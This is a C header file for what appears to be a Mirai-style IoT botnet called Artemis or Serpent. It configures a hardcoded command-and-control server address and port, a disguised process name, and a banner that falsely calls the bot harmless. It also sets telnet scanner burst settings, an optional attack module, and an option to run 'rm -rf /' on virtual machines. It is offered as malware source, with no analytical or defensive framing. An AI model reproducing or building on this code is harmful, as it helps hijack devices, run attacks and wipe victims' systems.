/*
Credits:
	https://developer.mbed.org/handbook/C-Data-Types
	http://www.netzmafia.de/skripten/unix/linux-daemon-howto.html
	https://en.wikipedia.org/wiki/Unix_signal
	http://stackoverflow.com/questions/10046916/is-it-possible-to-ignore-all-signals
	http://man7.org/linux/man-pages/man7/signal.7.html
	Hydra (2008)
	Mirai (2016)
	Qbot (?)
	http://www.binarytides.com/tcp-syn-portscan-in-c-with-linux-sockets/

To use:
	https://telnetscan.shadowserver.org/all/telnet_hilbert_1024_current.png
*/

#pragma once

#define _GNU_SOURCE

#undef WEAPONIZED // Has attk.c
#undef FUCKVMS    // rm -rf / on vms

/* Version */
#define VERSION "1.0"

// CNC information
#define SERVER_ADRESS "45.32.89.146"
#define SERVER_PORT 80
#define TIMEOUT 120 // Time between posts

// Malware name when observeed
#define PROC_NAME "artemis\0"

// Gateway info
#define GATE_KEY "KEY"

// Default readable text in ELF file
#define BOTINFO "Artemis is a harmless bot that just replicates!"

#define SCAN_SCANNER_BURST 100 // How many packets to send out each burst
#define SCAN_SCANNER_ERRMAX 200 // Max amount of errors before _exit(0);
#define SCAN_SCANNER_MAXCON 10 // Maximum connections
#define SCAN_SCANNER_SEC 5
#define SCAN_SCANNER_USEC 0

/* Normal headers */
#include <arpa/inet.h>
#include <ctype.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>

/* Type definitons and defines */

#define elif else if
typedef uint32_t ipv4_t;
typedef uint16_t port_t;

/* Debug headers */
#ifdef DEBUG
#include <stdarg.h>
#endif

/* Serpent headers */
#include "comm.h"
#include "debug.h"
#include "func.h"
#include "ipv4.h"
#include "obfsc.h"
#include "process.h"
#include "rand.h"
#include "scan.h"

#ifdef WEAPONIZED
#include "serpent_attk.h"
#endif
